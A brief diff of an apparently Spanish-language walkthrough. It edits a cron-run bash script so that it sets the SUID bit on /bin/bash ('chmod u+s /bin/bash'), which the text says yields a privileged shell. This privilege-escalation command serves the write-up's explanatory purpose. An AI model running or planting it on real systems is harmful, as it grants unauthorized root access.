@@ -229,7 +229,7 @@ Con el siguiente contenido:
 ```bash
 #!/bin/bash
 
-/bin/bash -p
+chmod u+s /bin/bash
 ```
 
 Tras la ejecución automática del cron se obtiene una shell privilegiada.
